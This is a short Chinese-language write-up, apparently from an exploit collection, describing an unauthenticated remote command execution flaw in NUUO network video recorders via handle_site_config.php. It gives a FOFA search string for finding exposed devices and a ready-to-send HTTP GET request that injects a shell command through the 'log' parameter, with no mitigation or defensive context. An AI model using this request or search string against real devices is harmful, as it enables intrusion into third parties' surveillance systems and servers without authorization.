# NUUO摄像机handle_site_config远程代码执行漏洞

NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，NUUO摄像头handle_site_config.php存在未授权命令执行漏洞，攻击者可以获取服务器权限

## fofa

```javascript
body="www.nuuo.com/eHelpdesk.php"
```

## poc

```javascript
GET /handle_site_config.php?log=;id; HTTP/1.1
Host: 
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
```

![image-20250219154105386](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502191541564.png)